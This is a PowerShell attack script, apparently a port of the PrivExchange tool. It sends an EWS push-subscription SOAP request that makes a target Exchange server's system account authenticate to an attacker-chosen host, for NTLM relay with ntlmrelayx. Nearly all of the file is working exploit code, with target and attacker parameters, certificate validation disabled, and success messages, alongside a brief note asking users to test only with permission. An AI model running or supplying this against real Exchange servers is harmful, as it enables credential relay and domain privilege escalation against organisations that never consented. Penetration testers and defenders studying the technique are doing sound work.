<#
.DESCRIPTION
    A powershell implementation of PrivExchange by @_dirkjan (original code found here: https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py)
    Useful for environments on which you cannot run python-based applications or do not want to drop files to disk.  Will cause the target exchange server system account to attempt to authenticate to a system of your choice.
.PARAMETER targetHost
    Hostname or IP of the target exchange box.  Based on DNS config may require FQDN if using hostname. (Required)
.PARAMETER attackerHost
    Hostname or IP of a system you control, and are ideally running ntlmrelayx on.  We are telling the Exchange server to attempt to authenticate to this system.  Based on DNS config may require FQDN if using hostname. (Required)
.PARAMETER exchangePort
    Port to attempt to connect to Exchange server over. Default is 443.
.PARAMETER attackerPort
    Port Exchange should attempt to connect back to the attacker over.  Default is 80
.PARAMETER attackerPage
    Page we are telling the Exchange server to connect to on our attack system. Slashes are not required.  Default is powerPriv.
.PARAMETER noSSL
    Set to true if you dont want to use https to connect initially to the Exchange server.  Default is false (use https).
.PARAMETER Version
    Version of Exchange server we're targeting.  Default is 2013.
.EXAMPLE
    powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
.NOTES
    Author: @g0ldenGunSec  - Based on the tool created by @_dirkjan
    Please only use this tool on networks you own or have permission to test against.   
#>


function powerPriv
{ 
    param ( 
        [string]$targetHost = $(throw "-targetHost is a mandatory paramater, please provide a value."),
        [string]$attackerHost = $(throw "-attackerHost is a mandatory paramater, please provide a value."),
        [string]$attackerPage = "powerPriv",
        [int]$attackerPort = 80,
        [int]$exchangePort = 443,
        [ValidateSet("true","false")]$noSSL = "false",
        [ValidateSet("2010_SP1","2010_SP2","2010_SP3","2013","2016")][String]$Version = "2013"
    ) 

    #building out exchange server target URL
    if($noSSL -eq "true")
    {
        $url = "http://$targetHost"
    }
    else
    {
        $url = "https://$targetHost"
    }

    if($exchangePort -ne 443)
    {
    $url = $url + ":$exchangePort"
    }
    $url += "/EWS/Exchange.asmx"

 
#sorry for bad indenting on this block, powershell was throwing spacing errors :)  This is the actual request sent to the server
$soapRequestStr = [string]@'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
   <soap:Header>
      <t:RequestServerVersion Version="Exchange9999" />
   </soap:Header>
  <soap:Body>
    <m:Subscribe>
         <m:PushSubscriptionRequest SubscribeToAllFolders="true">
            <t:EventTypes>
              <t:EventType>NewMailEvent</t:EventType>
              <t:EventType>ModifiedEvent</t:EventType>
              <t:EventType>MovedEvent</t:EventType>
            </t:EventTypes>
            <t:StatusFrequency>1</t:StatusFrequency>
            <t:URL>URLGoesHere</t:URL>
         </m:PushSubscriptionRequest>
      </m:Subscribe>
  </soap:Body>
</soap:Envelope>
'@
    #doing string replacement for our SOAP XML request to sub in our user-provided values
    $soapRequestStr = $soapRequestStr -replace "9999", $Version
    $attackerURL = "http://$attackerHost"
    if($attackerPort -ne 80)
    {
        $attackerURL += ":$attackerPort"
    }
    $attackerURL += "/$attackerPage/"
    $soapRequestStr = $soapRequestStr -replace "URLGoesHere", $attackerURL

    [xml]$soapRequest = [xml]$soapRequestStr


    #setting up web request to send to Exchange server
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} 
    $soapWebRequest = [System.Net.WebRequest]::Create($URL) 

    $soapWebRequest.ContentType = "text/xml;charset=`"utf-8`"" 
    $soapWebRequest.Accept      = "text/xml" 
    $soapWebRequest.Method      = "POST" 
    $soapWebRequest.UseDefaultCredentials = $true

    #sending request to exchange server
    try 
    {
        $requestStream = $soapWebRequest.GetRequestStream() 
        $SOAPRequest.Save($requestStream) 
        $requestStream.Close() 
    }
    catch [Net.WebException]
    {
        Write-Host "Error --- request unsuccessful:" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
        exit
    }

    write-host "Sent Request To Exchange Server: $URL"
        
    #waiting on response back from exchange server 
    try 
    {
        $resp = $soapWebRequest.GetResponse()
        $responseStream = $resp.GetResponseStream() 
        $soapReader = [System.IO.StreamReader]($responseStream)
        $returnedXML = $soapReader.ReadToEnd() 
        $responseStream.Close() 
    }
    catch [Net.WebException]
    {
        Write-Host "Error --- request unsuccessful:" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
        exit
    }
    if($resp.StatusCode -eq "OK")
    {
        if($returnedXML -match "NoError")
        {
            write-host "HTTP 200 response received, the target Exchange server should be authenticating shortly." -ForegroundColor Green
        }
        Elseif($returnedXML -match "ErrorMissingEmailAddress")
        {
            write-host "Error: User does not have an email address associated with their account" -ForegroundColor Red
        }   
        Else
        {
            write-host "An error has occured, attack was likely unsuccessful" -ForegroundColor Red
        }    
    }
    Else
    {
        write-host "Invalid / no response received, but a web exception did not occur. Attack may not have worked" -ForegroundColor Yellow
    }
}
